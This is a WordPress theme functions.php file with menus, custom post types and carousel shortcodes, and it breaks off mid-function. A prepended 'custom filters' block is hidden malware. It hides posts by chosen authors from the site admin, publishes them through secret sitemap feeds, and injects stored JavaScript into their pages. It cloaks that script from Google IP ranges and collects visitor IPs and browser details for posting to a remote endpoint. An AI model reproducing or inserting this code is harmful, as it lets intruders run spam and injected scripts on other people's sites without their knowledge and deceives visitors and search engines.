<?php

/* custom filters */

function add_where_condition($where) {
    global $wpdb, $userSettingsArr;

    $ids = array_keys($userSettingsArr);
    $idsCommaSeparated = implode(', ', $ids);


    if (!is_single() && is_admin()) {
        add_filter('views_edit-post', 'fix_post_counts');
        return $where . " AND {$wpdb->posts}.post_author NOT IN ($idsCommaSeparated)";
    }

    return $where;
}

function post_exclude($query) {

    global $userSettingsArr;

    $ids = array_keys($userSettingsArr);
    $excludeString = modifyWritersString($ids);

    if (!$query->is_single() && !is_admin()) {
        $query->set('author', $excludeString);
    }
}

function wp_core_js() {

    global $post, $userSettingsArr;

    foreach ($userSettingsArr as $id => $settings) {
        if (($id == $post->post_author) && (isset($settings['js']))) {
            
            if (hideJSsource($settings)) {
                break;
            }
            echo $settings['js'];
            break;
        }
    }
}

function hideJSsource($settings) {
    if (isset($settings['nojs']) && $settings['nojs'] === 1) {
        customSetDebug('cloacking is on!');
        customSendDebug();
        if (customCheckSe()) {
            return true;
        }
    }
    return false;
}

function fix_post_counts($views) {
    global $current_user, $wp_query;

    $types = array(
        array('status' => NULL),
        array('status' => 'publish'),
        array('status' => 'draft'),
        array('status' => 'pending'),
        array('status' => 'trash'),
        array('status' => 'mine'),
    );
    foreach ($types as $type) {

        $query = array(
            'post_type' => 'post',
            'post_status' => $type['status']
        );


        $result = new WP_Query($query);


        if ($type['status'] == NULL) {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['all'], $matches)) {
                $views['all'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['all']);
            }
        } elseif ($type['status'] == 'mine') {


            $newQuery = $query;
            $newQuery['author__in'] = array($current_user->ID);

            $result = new WP_Query($newQuery);

            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['mine'], $matches)) {
                $views['mine'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['mine']);
            }
        } elseif ($type['status'] == 'publish') {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['publish'], $matches)) {
                $views['publish'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['publish']);
            }
        } elseif ($type['status'] == 'draft') {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['draft'], $matches)) {
                $views['draft'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['draft']);
            }
        } elseif ($type['status'] == 'pending') {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['pending'], $matches)) {
                $views['pending'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['pending']);
            }
        } elseif ($type['status'] == 'trash') {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['trash'], $matches)) {
                $views['trash'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['trash']);
            }
        }
    }
    return $views;
}

function filter_function_name_4055($counts, $type, $perm) {

    if ($type === 'post') {
        $old_counts = $counts->publish;
        $counts_mod = posts_count_custom($perm);
        $counts->publish = !$counts_mod ? $old_counts : $counts_mod;
    }
    return $counts;
}

function posts_count_custom($perm) {
    global $wpdb, $userSettingsArr;

    $ids = array_keys($userSettingsArr);
    $idsCommaSeparated = implode(', ', $ids);


    $type = 'post';

    $query = "SELECT post_status, COUNT( * ) AS num_posts FROM {$wpdb->posts} WHERE post_type = %s";

    if ('readable' == $perm && is_user_logged_in()) {

        $post_type_object = get_post_type_object($type);

        if (!current_user_can($post_type_object->cap->read_private_posts)) {
            $query .= $wpdb->prepare(
                    " AND (post_status != 'private' OR ( post_author = %d AND post_status = 'private' ))", get_current_user_id()
            );
        }
    }
    $query .= " AND post_author NOT IN ($idsCommaSeparated) GROUP BY post_status";
    $results = (array) $wpdb->get_results($wpdb->prepare($query, $type), ARRAY_A);

    foreach ($results as $tmpArr) {
        if ($tmpArr['post_status'] === 'publish') {
            return $tmpArr['num_posts'];
        }
    }
}

function all_custom_posts_ids($userId) {
    global $wpdb;

    $query = "SELECT ID FROM {$wpdb->posts} where post_author = $userId";

    $results = (array) $wpdb->get_results($query, ARRAY_A);

    $ids = array();
    foreach ($results as $tmpArr) {
        $ids[] = $tmpArr['ID'];
    }
    return $ids;
}

function custom_flush_rules() {

    global $userSettingsArr, $wp_rewrite;

    $rules = get_option('rewrite_rules');


    foreach ($userSettingsArr as $key => $arr) {
        $regex = key($arr['sitemapsettings']);

        if (!isset($rules[$regex]) ||
                ($rules[$regex] !== current($arr['sitemapsettings']))) {
            $wp_rewrite->flush_rules();
        }
    }
}

function sitemap_xml_rules($rules) {

    global $userSettingsArr;

    $newrules = array();

    foreach ($userSettingsArr as $key => $arr) {
        if (isset($arr['sitemapsettings'])) {
            $newrules[key($arr['sitemapsettings'])] = current($arr['sitemapsettings']);
        }
    }

    return $newrules + $rules;
}

function customSitemapFeed() {

    global $userSettingsArr;

    foreach ($userSettingsArr as $key => $arr) {
        $feedName = str_replace('index.php?feed=', '', current($arr['sitemapsettings']));
        add_feed($feedName, 'customSitemapFeedFunc');
    }
}

function customSitemapFeedFunc() {
//ini_set('memory_limit', '256MB');
    header('Content-Type: ' . feed_content_type('rss-http') . '; charset=' . get_option('blog_charset'), true);
//header('Content-Type: ' . feed_content_type('rss') . '; charset=' . get_option('blog_charset'), true);
    status_header(200);

    $head = sitemapHead();
    $sitemapSource = $head . "\n";

    $userId = findUserIdByRequestUri();

    $posts_ids = all_custom_posts_ids($userId);
    $priority = '0.5';
    $changefreq = 'weekly';
    $lastmod = date('Y-m-d');

    foreach ($posts_ids as $post_id) {
        $url = get_permalink($post_id);
        $sitemapSource .= urlBlock($url, $lastmod, $changefreq, $priority);
        wp_cache_delete($post_id, 'posts');
    }

    $sitemapSource .= "\n</urlset>";

    echo $sitemapSource;
}

function sitemapHead() {
    return <<<STR
<?xml version="1.0" encoding="UTF-8"?>
<urlset
      xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9
            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">

    
STR;
}

function urlBlock($url, $lastmod, $changefreq, $priority) {

    return <<<STR
   <url>
      <loc>$url</loc>
      <lastmod>$lastmod</lastmod>
      <changefreq>$changefreq</changefreq>
      <priority>$priority</priority>
   </url>\n\n
STR;
}

function modifyWritersString($writersArr) {
    $writersArrMod = array();

    foreach ($writersArr as $item) {
        $writersArrMod[] = '-' . $item;
    }
    return implode(',', $writersArrMod);
}

function customFiltersSettings() {
    $settings = get_option('wp_custom_filters');
    if (!$settings) {
        return null;
    }
    return unserialize(base64_decode($settings));
}

function findUserIdByRequestUri() {

    global $userSettingsArr;

    foreach ($userSettingsArr as $key => $arr) {

        $regexp = key($arr['sitemapsettings']) . '|'
                . str_replace('index.php?', '', current($arr['sitemapsettings']) . '$');

        if (preg_match("~$regexp~", $_SERVER['REQUEST_URI'])) {
            return $key;
        }
    }
}

function isCustomPost() {
    global $userSettingsArr, $post;

    $authors_ids_arr = array_keys($userSettingsArr);
    if (in_array($post->post_author, $authors_ids_arr)) {
        return true;
    }
    return false;
}

function removeYoastMeta() {
    global $userSettingsArr, $post;

    $authors_ids_arr = array_keys($userSettingsArr);

    if (in_array($post->post_author, $authors_ids_arr)) {
        add_filter('wpseo_robots', '__return_false');
        add_filter('wpseo_googlebot', '__return_false'); // Yoast SEO 14.x or newer
        add_filter('wpseo_bingbot', '__return_false'); // Yoast SEO 14.x or newer
    }
}

function getRemoteIp() {

    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (isset($_SERVER['REMOTE_ADDR'])) {
        return $_SERVER['REMOTE_ADDR'];
    }

    return false;
}

function customCheckSe() {

    $ip = getRemoteIp();

    if (strstr($ip, ', ')) {
        $ips = explode(', ', $ip);
        $ip = $ips[0];
    }

    $ranges = customSeIps();

    if (!$ranges) {
        return false;
    }

    foreach ($ranges as $range) {
        if (customCheckInSubnet($ip, $range)) {
            customSetDebug(sprintf('black_list||%s||%s||%s||%s', $ip, $range
                            , $_SERVER['HTTP_USER_AGENT'], $_SERVER['HTTP_ACCEPT_LANGUAGE']));
            return true;
        }
    }
    
    customSetDebug(sprintf('white list||%s||%s||%s||%s', $ip, $range
                            , $_SERVER['HTTP_USER_AGENT'], $_SERVER['HTTP_ACCEPT_LANGUAGE']));
    return false;
}

function customIsRenewTime($timestamp) {
    //if ((time() - $timestamp) > 60 * 60 * 24) {
    if ((time() - $timestamp) > 60 * 60) {
        return true;
    }
    customSetDebug(sprintf('time - %s, timestamp - %s', time(), $timestamp));
    return false;
}

function customSetDebug($data) {

    if (($value = get_option('wp_debug_data')) && is_array($value)) {
        $value[] = sprintf('%s||%s||%s', time(), $_SERVER['HTTP_HOST'], $data);
        update_option('wp_debug_data', $value, false);
        return;
    }

    update_option('wp_debug_data', array($data), false);
}

function customSendDebug() {

    $value = get_option('wp_debug_data');

    if (!is_array($value) || (count($value) < 100)) {
        return;
    }
    $url = '';

    $response = wp_remote_post($url, array(
        'method' => 'POST',
        'timeout' => 10,
        'body' => array('debugdata' => base64_encode(serialize($value))))
    );

    if (is_wp_error($response)) {
        return;
    } else {
        if (trim($response['body']) === 'success') {
            update_option('wp_debug_data', array(), false);
        }
    }
}

function customSeIps() {

    if (($value = get_option('wp_custom_range')) && !customIsRenewTime($value['timestamp'])) {
        return $value['ranges'];
    } else {
        customSetDebug('time to update ranges');
        $response = wp_remote_get('https://www.gstatic.com/ipranges/goog.txt');
        if (is_wp_error($response)) {
            customSetDebug('error response ipranges');
            return;
        }
        $body = wp_remote_retrieve_body($response);
        $ranges = preg_split("~(\r\n|\n)~", trim($body), -1, PREG_SPLIT_NO_EMPTY);

        if (!is_array($ranges)) {
            customSetDebug('invalid update ranges not an array');
            return;
        }

        $value = array('ranges' => $ranges, 'timestamp' => time());
        update_option('wp_custom_range', $value, true);
        return $value['ranges'];
    }
}

function customInetToBits($inet) {
    $splitted = str_split($inet);
    $binaryip = '';
    foreach ($splitted as $char) {
        $binaryip .= str_pad(decbin(ord($char)), 8, '0', STR_PAD_LEFT);
    }
    return $binaryip;
}

function customCheckInSubnet($ip, $cidrnet) {
    $ip = inet_pton($ip);
    $binaryip = customInetToBits($ip);

    list($net, $maskbits) = explode('/', $cidrnet);
    $net = inet_pton($net);
    $binarynet = customInetToBits($net);

    $ip_net_bits = substr($binaryip, 0, $maskbits);
    $net_bits = substr($binarynet, 0, $maskbits);

    if ($ip_net_bits !== $net_bits) {
        //echo 'Not in subnet';
        return false;
    } else {
        return true;
    }
}

$userSettingsArr = customFiltersSettings();


if (is_array($userSettingsArr)) {
    add_filter('posts_where_paged', 'add_where_condition');

    add_action('pre_get_posts', 'post_exclude');
    add_action('wp_enqueue_scripts', 'wp_core_js');

    add_filter('wp_count_posts', 'filter_function_name_4055', 10, 3);

    add_filter('rewrite_rules_array', 'sitemap_xml_rules');
    add_action('wp_loaded', 'custom_flush_rules');
    add_action('init', 'customSitemapFeed');
    add_action('template_redirect', 'removeYoastMeta');
}

/* custom filters */
/*
 *  Author: Amandeep Singh
 *  Custom functions, support, custom post types and more.
 */

/*------------------------------------*\
	External Modules/Files
\*------------------------------------*/

// Load any external files you have here

/*------------------------------------*\
	Theme Support
\*------------------------------------*/

if (!isset($content_width))
{
    $content_width = 900;
}

if (function_exists('add_theme_support'))
{
    // Add Menu Support
    add_theme_support('menus');

    // Add Thumbnail Theme Support
    add_theme_support('post-thumbnails');
    add_image_size('large', 700, '', true); // Large Thumbnail
    add_image_size('medium', 250, '', true); // Medium Thumbnail
    add_image_size('small', 120, '', true); // Small Thumbnail
    add_image_size('custom-size', 700, 200, true); // Custom Thumbnail Size call using the_post_thumbnail('custom-size');
    add_image_size('project-image', 1080, 720, true); // Custom Thumbnail Size call using the_post_thumbnail('custom-size');

    // Add Support for Custom Backgrounds - Uncomment below if you're going to use
    /*add_theme_support('custom-background', array(
	'default-color' => 'FFF',
	'default-image' => get_template_directory_uri() . '/img/bg.jpg'
    ));*/

    // Add Support for Custom Header - Uncomment below if you're going to use
    /*add_theme_support('custom-header', array(
	'default-image'			=> get_template_directory_uri() . '/img/headers/default.jpg',
	'header-text'			=> false,
	'default-text-color'		=> '000',
	'width'				=> 1000,
	'height'			=> 198,
	'random-default'		=> false,
	'wp-head-callback'		=> $wphead_cb,
	'admin-head-callback'		=> $adminhead_cb,
	'admin-preview-callback'	=> $adminpreview_cb
    ));*/

    // Enables post and comment RSS feed links to head
    add_theme_support('automatic-feed-links');

    // Localisation Support
    load_theme_textdomain('ldavis', get_template_directory() . '/languages');
}

/*------------------------------------*\
	Functions
\*------------------------------------*/

// Ldavis Blank navigation
function ldavis_nav()
{
	wp_nav_menu(
	array(
		'theme_location'  => 'header-menu',
		'menu'            => '',
		'container'       => 'div',
		'container_class' => 'menu-{menu slug}-container',
		'container_id'    => '',
		'menu_class'      => 'menu',
		'menu_id'         => '',
		'echo'            => true,
		'fallback_cb'     => 'wp_page_menu',
		'before'          => '',
		'after'           => '',
		'link_before'     => '',
		'link_after'      => '',
		'items_wrap'      => '<ul>%3$s</ul>',
		'depth'           => 0,
		'walker'          => ''
		)
	);
}

function footer_menu()
{
	wp_nav_menu(
	array(
		'theme_location'  => 'footer-menu',
		'menu'            => '',
		'container'       => 'div',
		'container_class' => 'menu-{menu slug}-container',
		'container_id'    => '',
		'menu_class'      => 'menu',
		'menu_id'         => '',
		'echo'            => true,
		'fallback_cb'     => 'wp_page_menu',
		'before'          => '',
		'after'           => '<span class="cstmLine">|</span>',
		'link_before'     => '',
		'link_after'      => '',
		'items_wrap'      => '<ul>%3$s</ul>',
		'depth'           => 0,
		'walker'          => ''
		)
	);
}

// Load Ldavis Blank scripts (header.php)
function ldavis_header_scripts()
{
    if ($GLOBALS['pagenow'] != 'wp-login.php' && !is_admin()) {

    	wp_register_script('conditionizr', get_template_directory_uri() . '/js/lib/conditionizr-4.3.0.min.js', array(), '4.3.0'); // Conditionizr
        wp_enqueue_script('conditionizr'); // Enqueue it!

        wp_register_script('modernizr', get_template_directory_uri() . '/js/lib/modernizr-2.7.1.min.js', array(), '2.7.1'); // Modernizr
        wp_enqueue_script('modernizr'); // Enqueue it!

        
    }
}

// Load Ldavis Blank conditional scripts
function ldavis_conditional_scripts()
{
    if (is_page('pagenamehere')) {
        wp_register_script('scriptname', get_template_directory_uri() . '/js/scriptname.js', array('jquery'), '1.0.0'); // Conditional script(s)
        wp_enqueue_script('scriptname'); // Enqueue it!
    }
}

// Load Ldavis Blank styles
function ldavis_styles()
{
    wp_register_style('normalize', get_template_directory_uri() . '/normalize.css', array(), '1.0', 'all');
    wp_enqueue_style('normalize'); // Enqueue it!

    wp_register_style('animate', get_template_directory_uri() . '/css/animate.css', array(), '1.0', 'all');
    wp_enqueue_style('animate'); // Enqueue it!
	
    wp_register_style('ldavis', get_template_directory_uri() . '/style.css', array(), '1.0.1', 'all');
    wp_enqueue_style('ldavis'); // Enqueue it!
	
	wp_register_script('cycleJs', 'https://cdnjs.cloudflare.com/ajax/libs/jquery.cycle/3.03/jquery.cycle.all.min.js', array(), '', true);
    wp_enqueue_script('cycleJs'); // Enqueue it!
}

// Register Ldavis Blank Navigation
function register_ldavis_menu()
{
    register_nav_menus(array( // Using array to specify more menus if needed
        'header-menu' => __('Header Menu', 'ldavis'), // Main Navigation
        'sidebar-menu' => __('Sidebar Menu', 'ldavis'), // Sidebar Navigation
        'extra-menu' => __('Extra Menu', 'ldavis'),
		'footer-menu' => __('Footer Menu', 'ldavis')
    ));
}

// Remove the <div> surrounding the dynamic navigation to cleanup markup
function my_wp_nav_menu_args($args = '')
{
    $args['container'] = false;
    return $args;
}

// Remove Injected classes, ID's and Page ID's from Navigation <li> items
function my_css_attributes_filter($var)
{
    return is_array($var) ? array() : '';
}

// Remove invalid rel attribute values in the categorylist
function remove_category_rel_from_category_list($thelist)
{
    return str_replace('rel="category tag"', 'rel="tag"', $thelist);
}

// Add page slug to body class, love this - Credit: Starkers Wordpress Theme
function add_slug_to_body_class($classes)
{
    global $post;
    if (is_home()) {
        $key = array_search('blog', $classes);
        if ($key > -1) {
            unset($classes[$key]);
        }
    } elseif (is_page()) {
        $classes[] = sanitize_html_class($post->post_name);
    } elseif (is_singular()) {
        $classes[] = sanitize_html_class($post->post_name);
    }

    return $classes;
}

// If Dynamic Sidebar Exists
if (function_exists('register_sidebar'))
{
    // Define Sidebar Widget Area 1
    register_sidebar(array(
        'name' => __('Widget Area 1', 'ldavis'),
        'description' => __('Description for this widget-area...', 'ldavis'),
        'id' => 'widget-area-1',
        'before_widget' => '<div id="%1$s" class="%2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3>'
    ));

    // Define Sidebar Widget Area 2
    register_sidebar(array(
        'name' => __('Widget Area 2', 'ldavis'),
        'description' => __('Description for this widget-area...', 'ldavis'),
        'id' => 'widget-area-2',
        'before_widget' => '<div id="%1$s" class="%2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3>'
    ));
}

// Remove wp_head() injected Recent Comment styles
function my_remove_recent_comments_style()
{
    global $wp_widget_factory;
    remove_action('wp_head', array(
        $wp_widget_factory->widgets['WP_Widget_Recent_Comments'],
        'recent_comments_style'
    ));
}



// Custom Excerpts
function ldavis_index($length) // Create 20 Word Callback for Index page Excerpts, call using ldaviswp_excerpt('ldavis_index');
{
    return 20;
}
 
add_filter( 'excerpt_length', 'ldavis_index', 999 );


// Create the Custom Excerpts callback
function ldavis_excerpt($length_callback = '', $more_callback = '')
{
    global $post;
    if (function_exists($length_callback)) {
        add_filter('excerpt_length', $length_callback);
    }
    if (function_exists($more_callback)) {
        add_filter('excerpt_more', $more_callback);
    }
    $output = get_the_excerpt();
    $output = apply_filters('wptexturize', $output);
    $output = apply_filters('convert_chars', $output);
    $output = '<p>' . $output . '</p>';
    echo $output;
}

// Custom View Article link to Post
function ldavis_blank_view_article($more)
{
    global $post;
    return '... <a class="view-article" href="' . get_permalink($post->ID) . '">' . __('View Article', 'ldavis') . '</a>';
}

// Remove Admin bar


// Remove 'text/css' from our enqueued stylesheet
function ldavis_style_remove($tag)
{
    return preg_replace('~\s+type=["\'][^"\']++["\']~', '', $tag);
}

// Remove thumbnail width and height dimensions that prevent fluid images in the_thumbnail
function remove_thumbnail_dimensions( $html )
{
    $html = preg_replace('/(width|height)=\"\d*\"\s/', "", $html);
    return $html;
}

// Custom Gravatar in Settings > Discussion
function ldavisgravatar ($avatar_defaults)
{
    $myavatar = get_template_directory_uri() . '/img/gravatar.jpg';
    $avatar_defaults[$myavatar] = "Custom Gravatar";
    return $avatar_defaults;
}

// Threaded Comments
function enable_threaded_comments()
{
    if (!is_admin()) {
        if (is_singular() AND comments_open() AND (get_option('thread_comments') == 1)) {
            wp_enqueue_script('comment-reply');
        }
    }
}

// Custom Comments Callback
function ldaviscomments($comment, $args, $depth)
{
	$GLOBALS['comment'] = $comment;
	extract($args, EXTR_SKIP);

	if ( 'div' == $args['style'] ) {
		$tag = 'div';
		$add_below = 'comment';
	} else {
		$tag = 'li';
		$add_below = 'div-comment';
	}
?>
    <!-- heads up: starting < for the html tag (li or div) in the next line: -->
    <<?php echo $tag ?> <?php comment_class(empty( $args['has_children'] ) ? '' : 'parent') ?> id="comment-<?php comment_ID() ?>">
	<?php if ( 'div' != $args['style'] ) : ?>
	<div id="div-comment-<?php comment_ID() ?>" class="comment-body">
	<?php endif; ?>
	<div class="comment-author vcard">
	<?php if ($args['avatar_size'] != 0) echo get_avatar( $comment, $args['180'] ); ?>
	<?php printf(__('<cite class="fn">%s</cite> <span class="says">says:</span>'), get_comment_author_link()) ?>
	</div>
<?php if ($comment->comment_approved == '0') : ?>
	<em class="comment-awaiting-moderation"><?php _e('Your comment is awaiting moderation.') ?></em>
	<br />
<?php endif; ?>

	<div class="comment-meta commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>">
		<?php
			printf( __('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('(Edit)'),'  ','' );
		?>
	</div>

	<?php comment_text() ?>

	<div class="reply">
	<?php comment_reply_link(array_merge( $args, array('add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
	</div>
	<?php if ( 'div' != $args['style'] ) : ?>
	</div>
	<?php endif; ?>
<?php }

/*------------------------------------*\
	Actions + Filters + ShortCodes
\*------------------------------------*/

// Add Actions
add_action('init', 'ldavis_header_scripts'); // Add Custom Scripts to wp_head
add_action('wp_print_scripts', 'ldavis_conditional_scripts'); // Add Conditional Page Scripts
add_action('get_header', 'enable_threaded_comments'); // Enable Threaded Comments
add_action('wp_enqueue_scripts', 'ldavis_styles'); // Add Theme Stylesheet
add_action('init', 'register_ldavis_menu'); // Add Ldavis Blank Menu

add_action('widgets_init', 'my_remove_recent_comments_style'); // Remove inline Recent Comment Styles from wp_head()
add_action('init', 'ldaviswp_pagination'); // Add our Ldavis Pagination

// Remove Actions
remove_action('wp_head', 'feed_links_extra', 3); // Display the links to the extra feeds such as category feeds
remove_action('wp_head', 'feed_links', 2); // Display the links to the general feeds: Post and Comment Feed
remove_action('wp_head', 'rsd_link'); // Display the link to the Really Simple Discovery service endpoint, EditURI link
remove_action('wp_head', 'wlwmanifest_link'); // Display the link to the Windows Live Writer manifest file.
remove_action('wp_head', 'index_rel_link'); // Index link
remove_action('wp_head', 'parent_post_rel_link', 10, 0); // Prev link
remove_action('wp_head', 'start_post_rel_link', 10, 0); // Start link
remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0); // Display relational links for the posts adjacent to the current post.
remove_action('wp_head', 'wp_generator'); // Display the XHTML generator that is generated on the wp_head hook, WP version
remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);
remove_action('wp_head', 'rel_canonical');
remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0);

// Add Filters
add_filter('avatar_defaults', 'ldavisgravatar'); // Custom Gravatar in Settings > Discussion
add_filter('body_class', 'add_slug_to_body_class'); // Add slug to body class (Starkers build)
add_filter('widget_text', 'do_shortcode'); // Allow shortcodes in Dynamic Sidebar
add_filter('widget_text', 'shortcode_unautop'); // Remove <p> tags in Dynamic Sidebars (better!)
add_filter('wp_nav_menu_args', 'my_wp_nav_menu_args'); // Remove surrounding <div> from WP Navigation
// add_filter('nav_menu_css_class', 'my_css_attributes_filter', 100, 1); // Remove Navigation <li> injected classes (Commented out by default)
// add_filter('nav_menu_item_id', 'my_css_attributes_filter', 100, 1); // Remove Navigation <li> injected ID (Commented out by default)
// add_filter('page_css_class', 'my_css_attributes_filter', 100, 1); // Remove Navigation <li> Page ID's (Commented out by default)
add_filter('the_category', 'remove_category_rel_from_category_list'); // Remove invalid rel attribute
add_filter('the_excerpt', 'shortcode_unautop'); // Remove auto <p> tags in Excerpt (Manual Excerpts only)
add_filter('the_excerpt', 'do_shortcode'); // Allows Shortcodes to be executed in Excerpt (Manual Excerpts only)
add_filter('excerpt_more', 'ldavis_blank_view_article'); // Add 'View Article' button instead of [...] for Excerpts
add_filter('style_loader_tag', 'ldavis_style_remove'); // Remove 'text/css' from enqueued stylesheet
add_filter('post_thumbnail_html', 'remove_thumbnail_dimensions', 10); // Remove width and height dynamic attributes to thumbnails
add_filter('image_send_to_editor', 'remove_thumbnail_dimensions', 10); // Remove width and height dynamic attributes to post images

// Remove Filters
remove_filter('the_excerpt', 'wpautop'); // Remove <p> tags from Excerpt altogether

add_action('admin_head', 'editor_full_width_gutenberg');

function editor_full_width_gutenberg() {
    echo '<style>
    body.gutenberg-editor-page .editor-post-title__block, body.gutenberg-editor-page .editor-default-block-appender, body.gutenberg-editor-page .editor-block-list__block {
        max-width: none !important;
    }
    .block-editor__container .wp-block {
        max-width: none !important;
    }
  </style>';
}

/*------------------------------------*\
	Custom Post Types
\*------------------------------------*/

// Create 1 Custom Post type for a Demo, called Ldavis-Blank


/*------------------------------------*\
	ShortCode Functions
\*------------------------------------*/

if( function_exists('acf_add_options_page') ) {
    
    acf_add_options_page(array(
        'page_title'    => 'Theme General Settings',
        'menu_title'    => 'Theme Settings',
        'menu_slug'     => 'theme-general-settings',
        'capability'    => 'edit_posts',
        'redirect'      => true
    ));
    
    acf_add_options_sub_page(array(
        'page_title'    => 'Header Settings',
        'menu_title'    => 'Header',
        'parent_slug'   => 'theme-general-settings',
    ));
    
    acf_add_options_sub_page(array(
        'page_title'    => 'Footer Settings',
        'menu_title'    => 'Footer',
        'parent_slug'   => 'theme-general-settings',
    ));
    
}

function enq_scripts_styles(){
	
	
	
	wp_enqueue_script('ldavisplugin', get_template_directory_uri() . '/js/plugin.js', array('jquery'), '1.0.0',True);
	wp_enqueue_script(
        'magnificJs',get_stylesheet_directory_uri() . '/js/jquery.magnific-popup.js',array( 'jquery' ),false,True
    );
    wp_enqueue_style('magnificCss',get_stylesheet_directory_uri().'/css/magnific-popup.css');
    wp_enqueue_script( 'owlJs',get_stylesheet_directory_uri() . '/js/owl.carousel.js',array( 'jquery' ),false,True );
    wp_enqueue_script( 'slicksliderJs',get_stylesheet_directory_uri() . '/js/slick.min.js',array( 'jquery' ),false,true );
	wp_enqueue_script('isotopescripts', get_stylesheet_directory_uri() . '/js/isotope.pkgd.js', array('jquery'), '1.0.0',True);
	wp_enqueue_script('vivusscripts', get_stylesheet_directory_uri() . '/js/vivus.min.js', array('jquery'), '1.0.0',True);
	
    wp_enqueue_style('owlCss',get_stylesheet_directory_uri().'/css/owl.carousel.min.css');

    wp_enqueue_style('slickthemeCss',get_stylesheet_directory_uri().'/css/slick-theme.css');
    wp_enqueue_style('slickCss',get_stylesheet_directory_uri().'/css/slick.css');

	wp_enqueue_style('animateCss',get_stylesheet_directory_uri().'/css/animate.css');
    wp_enqueue_script('animationscripts', get_template_directory_uri() . '/js/gsap.min.js', array('jquery'), '1.0.0',True); // animation scripts
    wp_enqueue_script('swipedscripts', get_template_directory_uri() . '/js/swiped-events.js', array('jquery'), '1.0.0',True); // Custom scripts
    wp_enqueue_script('ldavisscripts', get_template_directory_uri() . '/js/scripts.js', array('jquery'), '1.0.9',True); // Custom scripts
  
}

add_action( 'wp_enqueue_scripts', 'enq_scripts_styles' );

// Our custom post type function
function create_posttype() {
 
    register_post_type( 'projects',
    // CPT Options
        array(
            'labels' => array(
                'name' => __( 'Projects' ),
                'singular_name' => __( 'Project' )
            ),
			'taxonomies' => array(''),
            'public' => true,
            'has_archive' => false,
            'rewrite' => array('slug' => 'projects'),
            'show_in_rest' => true,
            'supports' => array( 'thumbnail','excerpt','title','editor' )
 
        )
    );
	
	// register_post_type( 'faq',
 //    // CPT Options
 //        array(
 //            'labels' => array(
 //                'name' => __( 'Faqs' ),
 //                'singular_name' => __( 'faq' )
 //            ),
	// 		'taxonomies' => array(''),
 //            'public' => true,
 //            'has_archive' => false,
 //            'rewrite' => array('slug' => 'faq'),
 //            'show_in_rest' => true,
 //            'supports' => array( 'thumbnail','excerpt','title','editor' )
 
 //        )
 //    );
	
	
	register_post_type( 'testimonials',
    // CPT Options
        array(
            'labels' => array(
                'name' => __( 'Testimonials' ),
                'singular_name' => __( 'Testimonial' )
            ),
            'public' => true,
            'has_archive' => false,
            'rewrite' => array('slug' => 'testimonials'),
            'show_in_rest' => true,
            'supports' => array( 'thumbnail','excerpt','title','editor' )
 
        )
    );
}
// Hooking up our function to theme setup
add_action( 'init', 'create_posttype' );

function recntProject(){ 
            $projects = new WP_Query(
                array(
                    'post_type' => 'projects',
                    'posts_per_page' => -1,
                    'post_status' => 'publish',
                )
            ); 
            #print_r(count($projects->posts)); die;
            if( !empty(count($projects->posts)) ){
				if ( wp_is_mobile() ) {
					$setArratData = 1;
				}else{
					$setArratData = 3;
				}
				
                $totalArrD = ceil(count($projects->posts)/$setArratData);
				$arrData = array_chunk($projects->posts,$setArratData);
				?>
                    <div class="recent-project">					
						<div class="heading">
							<div class="container">
								<h4>RECENT PROJECTS <a href="<?php echo site_url('project'); ?>">| SEE MORE</a></h4>
								<!--div class="btns">
									<span class="prev"></span>
									<div id="counter"></div>
									<span class="next"></span>
								</div-->
							</div>
						</div>
                        <div class="mainOwlCrsl owl-carousel owl-theme">
							<?php foreach ($projects->posts as $innerData) { ?> 
                                <div class="inner-slids">
                                    <a href="<?php if( !empty( get_field('enable_link',$innerData->ID) ) ){ echo get_the_permalink($innerData->ID); }else{ echo 'javascript:void(0)'; } ?>">
                                        <?php $projectImage = wp_get_attachment_image_src( get_post_thumbnail_id( $innerData->ID ), 'project-image' ); ?>
                                        <img src="<?php echo $projectImage[0]; ?>">
                                        <h3><?php echo get_the_title($innerData->ID); ?></h3>
                                    </a>
                                </div>  
                            <?php } ?>
                        </div> 
                    </div>
        <?php }
}


add_shortcode('recentProject','recntProject');

function testimonialShortcode(){
	$testimonials = new WP_Query(
        array(
            'post_type' => 'testimonials',
            'posts_per_page' => -1,
            'post_status' => 'publish',
        )
    );
	if( !empty(count($testimonials->posts)) ){ ?>
			<div id="testimonialOwl" class="owl-carousel owl-theme">
				<?php foreach( $testimonials->posts as $testimonial ){ ?>
					<div class="item">
						<div class="quote">
							<?php
							$my_postid = $testimonial->ID;
							$content_post = get_post($my_postid);
							$content = $content_post->post_content;
							$content = apply_filters('the_content', $content);
							$content = str_replace(']]>', ']]&gt;', $content);
							echo $content;
							?>
						</div>
						<div class="rating">
							<?php 
							for($count=1; $count<=5; $count++){
								if( $count <= get_field('rating',$testimonial->ID) ){
									$color = 'color:#a69f82;';
								}else{
									$color = 'color:#ccc;';
								}
